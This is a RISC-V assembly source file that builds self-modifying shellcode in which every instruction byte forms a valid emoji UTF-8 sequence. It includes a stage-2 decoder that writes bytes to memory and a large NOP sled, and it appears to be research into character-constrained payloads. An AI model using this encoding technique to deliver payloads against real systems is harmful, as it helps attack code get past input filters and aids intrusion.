/*#
 *# (c) 2021-2022 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

include(`helpers/common.m4')#'

.macro jumper_with_zero_a3 before_land_size:req
    ins2 0xe29c ### add	s9,s9,s8
    ins2 0x85c2 #beqz	a3,+0x20
    ins2 0xa9ef
    ins2 0xb88f
    clog (0x1a - \before_land_size)
.endm

.macro jumper_with_nonzero_a3 before_land_size:req
    # e29c85 ✅ e29988 ♈ CLOG(0x1c)
    ins2 0xe29c ### add	s9,s9,s8
    ins2 0x85e2 # bnez	a3,+0x20
    ins2 0x9988
    clog (0x1c - \before_land_size)
.endm

.global _start
_start:

non0a5:
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins4 0x9387e2ac # addi a5,t0,-1330
    ins2 0x85ef # bnez a5,+0x38
    ins2 0xb88f # <after jump>
    clog 0x34

setuppcfixup:
    # First, set a1 to 0
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins4 0x93a5f09f # slti     a1,ra,-1537
    ins2 0x868e     ### mv     t4,ra

    # Then, set t0 to zero
    jumper_with_nonzero_a3 2
    ins2 0xf09f # <before land>
    ins4 0x93a2e281 # slti    t0,t0,-2018
    ins2 0x89ef # bnez    a5,+0x1a
    ins2 0xb88f # <after jump>
    clog 0x14

    jumper_with_nonzero_a3 2
    ins2 0xf09f # <before land>
    ins4 0x93a2e281 # slti    t0,t0,-2018
    ins2 0x89ef # bnez    a5,+0x1a
    ins2 0xb88f # <after jump>
    clog 0x14

.macro t0addiforfixup
    ins2 0xf09f # before land
    ins4 0x9382e281 # addi    t0,t0,-2018
    ins2 0x89ef ### bnez    a5,+0x1a
    ins2 0xb88f ### <after jump>
    clog 0x14
.endm

    # Then, set t0 fixup
    repeat(35, {t0addiforfixup})

    # Then, move fixup to t2
    ins2 0xf09f # before land
    ins4 0x9383e2ac # addi	t2,t0,-1330
    ins2 0x85ef ### bnez	a5,+0x38
    ins2 0xb88f ### <after jump>
    clog 0x33

    .byte 0xe2 # before land
    ins2 0x9e95 # add a1,a1,t2

getbadpc:
    ins2 0xe29d     ### add    s11,s11,s8
    ins4 0x97f09f88 # auipc    ra,0x889ff
    ins4 0xb7efb88f ### lui    t6,0x8fb8e

seta3:
    # Then, set t0 to zero
    jumper_with_nonzero_a3 2
    ins2 0xf09f # <before land>
    ins4 0x93a2e281 # slti    t0,t0,-2018
    ins2 0x89ef # bnez    a5,+0x1a
    ins2 0xb88f # <after jump>
    clog 0x14

    # First, set a3 to 0
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins4 0x93a6e2ac #slti a3,t0,-1330
    ins2 0x85ef # bnez a5,+0x38
    ins2 0xb88f # <after jump>
    clog 0x32

    # Then, set a3 to ra
    ins2 0xf09f # before land
    ins2 0x8696   # add a3,a3,ra

fixa3:
    # First, load matching offset
    jumper_with_nonzero_a3 3
    .byte 0xf0, 0x9f, 0xaa # before land
    ins4 0xb7f09f88        # lui ra,0x889ff
    ins4 0xb7efb88f        # lui t6,0x8fb8e

    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins2 0x8695 # add a1,a1,ra

    # Finally, subtract to a3
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins2 0x8d8e # sub a3,a3,a1

t2to1:
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins4 0x93b3f09f # sltiu    t2,ra,-1537
    ins2 0x868e     ### mv     t4,ra

a1to1:
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins4 0x93a5f09f # slti    a1,ra,-1537
    ins2 0x868e     ### mv     t4,ra

rato1:
    jumper_with_nonzero_a3 2
    ins2 0xf09f # before land
    ins4 0x93b0e38a # sltiu	   ra,t2,-2034
    ins2 0x99ef     ### bnez	a5,+0x1e
    ins2 0xb88f     ### <after jump>
    clog 0x1a

t0to8:
    repeat(15, {
        jumper_with_nonzero_a3 2
        ins2 0xf09f # before land
        ins2 0x8692 # add	t0,t0,ra
    })

.macro incr_a1
    # ... e29e95 ➕
    jumper_with_nonzero_a3 1
    .byte 0xe2
    ins2 0x9e95 # add    a1,a1,t2
.endm

.macro incr16_a1
    # ... e29e95 ➕
    jumper_with_nonzero_a3 2
    ins2 0xf09f
    ins2 0x9695 # add    a1,a1,t0
.endm

.macro stage2_write_byte
    # First, store a1
#if RV_BITS == 32
    # e29988 ♈ c2a9efb88f ©️
    ins2 0xe299 ### add   s3,s3,s8
    ins2 0x8cc2 #   sw    a1,0(a3)
    ins2 0xa9ef ### bnez  a5,+0x5a
    ins2 0xb88f
    clog 0x54
#elif RV_BITS == 64
    # e29d8c ❌ e2998b ♋
    ins2 0xe29d ### add  s11,s11,s8
    ins2 0x8ce2 #   sd   a1,0(a3)
    ins2 0x998b ### andi a5,a5,6 /* Multiple other possibilities */
#else
    #error Unknown RV_BITS
#endif

    # Then, increment a3
    # e29989 ♉ e29e96 ➖
    ins2 0xe299 ### add s3,s3,s8
    ins2 0x89e2 ### bnez a3,+0x2
    ins2 0x9e96 #   add  a3,a3,t2
.endm

stage2decode:
#include "stage2_encoded.S"

.macro nop6
    ins2 0xe29a     # add   s5,s5,s8
    ins4 0x97efb88f # auipc t6,0x8fb8e
.endm

nopsled:
    jumper_with_nonzero_a3 0
    repeat(1000, {nop6})
